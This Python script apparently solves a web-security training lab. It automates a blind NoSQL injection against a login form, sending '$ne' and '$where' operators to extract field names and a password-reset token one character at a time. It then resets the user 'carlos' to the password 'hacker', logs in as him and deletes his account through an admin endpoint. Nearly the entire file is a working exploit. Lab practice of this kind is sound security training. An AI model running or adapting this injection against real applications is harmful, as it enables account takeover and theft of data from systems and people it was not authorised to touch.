import requests
from rich.console import Console
import re
import utils
import string
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.console = Console()
        self.lowercase_alphanumeric = list(string.ascii_letters)
        self.lock = Lock()
        self.fields = []
        self.reset_token = None

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def reset_carlos_password(self):
        data = {
            'csrf': self.get_csrf_token('forgot-password'),
            'username': 'carlos'
        }
        self.session.post(self.lab_url + 'forgot-password', data=data)

    @staticmethod
    def binary_search(arr, low, high, custom_function, **kwargs):
        while low <= high:
            mid = low + (high - low) // 2

            if custom_function('==', arr[mid], **kwargs):
                return mid

            elif custom_function('>', arr[mid], **kwargs):
                low = mid + 1

            else:
                high = mid - 1

        return -1

    def check_length_of_fields(self, operator, length):
        data = {
            'username': 'carlos',
            'password': {'$ne': 'hacker'},
            '$where': 'Object.keys(this).length{}{}'.format(operator, length)
        }
        response = self.session.post(self.lab_url + 'login', json=data)
        if 'Account locked: please reset your password' not in response.text:
            utils.cprint(self, 'Number of fields are {} {}'.format(operator, length), 'failure')
            return False
        else:
            if operator != '==':
                utils.cprint(self, 'Number of fields are {} {}'.format(operator, length), 'info')
            else:
                utils.cprint(self, 'Number of fields are {} {}'.format(operator, length), 'success')
            return True

    def calc_fields_length(self):
        utils.cprint(self, 'Exfiltrating number of fields available...', 'ack')
        fields_length = self.binary_search(list(range(1, 21)), 0, 19, self.check_length_of_fields) + 1
        return fields_length

    def check_length(self, operator, length, index):
        data = {
            'username': 'carlos',
            'password': {'$ne': 'hacker'},
            '$where': 'Object.keys(this)[{}].length{}{}'.format(index, operator, length)
        }
        response = self.session.post(self.lab_url + 'login', json=data)
        if 'Account locked: please reset your password' not in response.text:
            with self.lock:
                utils.cprint(self, 'Field number {} length {} {}'.format(index, operator, length), 'failure')
            return False
        else:
            if operator != '==':
                with self.lock:
                    utils.cprint(self, 'Field number {} length {} {}'.format(index, operator, length), 'info')
            else:
                with self.lock:
                    utils.cprint(self, 'Field number {} length {} {}'.format(index, operator, length), 'success')
            return True

    def calc_field_length(self, index):
        with self.lock:
            utils.cprint(self, 'Exfiltrating field number {} length...'.format(index), 'ack')
        field_length = self.binary_search(list(range(1, 21)), 0, 19, self.check_length, index=index) + 1
        return field_length

    def check_field_name(self, index, position, character):
        data = {
            'username': 'carlos',
            'password': {'$ne': 'hacker'},
            '$where': 'Object.keys(this)[{}].match(\'^.{{{}}}{}.*\')'.format(index, position, character)
        }
        response = self.session.post(self.lab_url + 'login', json=data)
        if 'Account locked: please reset your password' not in response.text:
            return False
        else:
            with self.lock:
                utils.cprint(self, 'Field number {} at position {}: {}'.format(index, position, character), 'success')
            return True

    def find_valid_character(self, field, index):
        for character in self.lowercase_alphanumeric:
            if self.check_field_name(field, index, character):
                return character

    def get_field_name(self, index):
        field_name = ''
        field_length = self.calc_field_length(index)

        with ThreadPoolExecutor() as executor:
            futures = [executor.submit(self.find_valid_character, index, i) for i in range(field_length)]

            for future in futures:
                character = future.result()
                if character:
                    field_name += character

        with self.lock:
            utils.cprint(self, 'Field number {} is: {}'.format(index, field_name), 'success')

        return field_name

    def get_all_field_names(self):
        field_names = []

        with ThreadPoolExecutor() as executor:
            futures = [executor.submit(self.get_field_name, i) for i in range(self.calc_fields_length())]

            for future in futures:
                field_name = future.result()
                if field_name:
                    field_names.append(field_name)

        utils.cprint(self, 'Available fields are: {}'.format(', '.join(field_names)), 'success')
        self.fields = field_names

    def check_target_field_length(self, operator, length, name):
        data = {
            'username': 'carlos',
            'password': {'$ne': 'hacker'},
            '$where': 'this.{}.length{}{}'.format(name, operator, length)
        }
        response = self.session.post(self.lab_url + 'login', json=data)
        if 'Account locked: please reset your password' not in response.text:
            utils.cprint(self, '{} field length {} {}'.format(name, operator, length), 'failure')
            return False
        else:
            if operator != '==':
                utils.cprint(self, '{} field length {} {}'.format(name, operator, length), 'info')
            else:
                utils.cprint(self, '{} field length {} {}'.format(name, operator, length), 'success')
            return True

    def calc_target_field_value_length(self, name):
        utils.cprint(self, 'Exfiltrating {} field value length...'.format(name), 'ack')
        field_value_length = self.binary_search(list(range(1, 21)), 0, 19, self.check_target_field_length, name=name) + 1
        return field_value_length

    def check_field_value(self, position, character, index):
        data = {
            'username': 'carlos',
            'password': {'$ne': 'hacker'},
            '$where': 'this.{}.match(\'^.{{{}}}{}.*\')'.format(self.fields[index], position, character)
        }
        response = self.session.post(self.lab_url + 'login', json=data)
        if 'Account locked: please reset your password' not in response.text:
            return False
        else:
            with self.lock:
                utils.cprint(self, 'Filed number {} value at position {}: {}'.format(index, position, character), 'success')
            return True

    def find_field_value_valid_character(self, position, index):
        lowercase_alphanumeric = list(string.digits + string.ascii_lowercase)
        for character in lowercase_alphanumeric:
            if self.check_field_value(position, character, index):
                return character

    def extract_field_value(self):
        index = len(self.fields) - 1
        field_name = self.fields[-1]
        field_value = ''
        field_length = self.calc_target_field_value_length(field_name)

        utils.cprint(self, 'Exfiltrating {} field value...'.format(field_name), 'ack')

        with ThreadPoolExecutor() as executor:
            futures = [executor.submit(self.find_field_value_valid_character, i, index) for i in range(field_length)]

            for future in futures:
                character = future.result()
                if character:
                    field_value += character

        utils.cprint(self, 'Field number {} is: {}'.format(index, field_name), 'success')

        self.reset_token = field_value

    def change_carlos_password(self):
        response = self.session.get(self.lab_url + 'forgot-password?' + self.fields[-1] + '=' + self.reset_token)
        csrf = re.search('name="csrf" value="(.*)"', response.text).group(1)

        data = {
            'csrf': csrf,
            self.fields[-1]: self.reset_token,
            'new-password-1': 'hacker',
            'new-password-2': 'hacker'
        }
        self.session.post(self.lab_url + 'forgot-password?' + self.fields[-1] + '=' + self.reset_token, data=data)

    def sign_in_as_carlos_and_delete_carlos(self):
        data = {
            'username': 'carlos',
            'password': 'hacker'
        }
        self.session.post(self.lab_url + 'login', json=data)

        self.session.get(self.lab_url + 'admin/delete?username=carlos')

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.reset_carlos_password()
        self.get_all_field_names()
        self.calc_target_field_value_length(self.fields[-1])
        self.extract_field_value()
        self.change_carlos_password()
        self.sign_in_as_carlos_and_delete_carlos()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
